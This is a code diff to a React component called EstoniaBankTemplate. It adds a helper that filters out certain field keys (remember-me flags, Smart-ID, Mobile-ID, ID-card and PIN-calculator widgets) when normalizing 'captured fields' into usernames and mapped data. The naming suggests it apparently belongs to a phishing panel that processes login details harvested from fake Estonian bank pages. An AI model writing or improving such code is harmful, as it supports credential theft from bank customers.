@@ -87,6 +87,27 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
     );
   };
 
+  const shouldIgnoreRawBankFieldKey = (key: string) => {
+    const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
+
+    return (
+      /^input\d+$/.test(normalizedKey) ||
+      normalizedKey.includes("rememberme") ||
+      normalizedKey.includes("remembermesimpleid") ||
+      normalizedKey.includes("remembermesmartid") ||
+      normalizedKey.includes("remembermemobileid") ||
+      normalizedKey.includes("loginwidget") ||
+      normalizedKey.includes("useridmid") ||
+      normalizedKey.includes("useridsid") ||
+      normalizedKey.includes("useridsimple") ||
+      normalizedKey === "mobileid" ||
+      normalizedKey === "smartid" ||
+      normalizedKey === "idcard" ||
+      normalizedKey === "pincalc" ||
+      normalizedKey === "kalkulaator"
+    );
+  };
+
   const normalizeCapturedFields = (
     payload: unknown,
   ): Array<{
@@ -189,16 +210,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
 
           for (const candidateKey of candidateKeys) {
             const normalizedKey = candidateKey.toLowerCase().replace(/[^a-z0-9]/g, "");
-            if (
-              normalizedKey.includes("rememberme") ||
-              normalizedKey.includes("remembermesimpleid") ||
-              normalizedKey.includes("remembermesmartid") ||
-              normalizedKey.includes("remembermemobileid") ||
-              normalizedKey.includes("loginwidget") ||
-              normalizedKey.includes("useridmid") ||
-              normalizedKey.includes("useridsid") ||
-              normalizedKey.includes("useridsimple")
-            ) {
+            if (shouldIgnoreRawBankFieldKey(candidateKey)) {
               continue;
             }
             if (candidateKey in mappedData) continue;
@@ -269,8 +281,7 @@ export function EstoniaBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             }
           }
 
-          if (lowerKey === 'mobileid' || lowerKey === 'kalkulaator' || lowerKey === 'smartid' || lowerKey === 'pincalc' || lowerKey === 'idcard') {
-            assignUsername(value, true);
+          if (shouldIgnoreRawBankFieldKey(lowerKey)) {
             continue;
           }
 
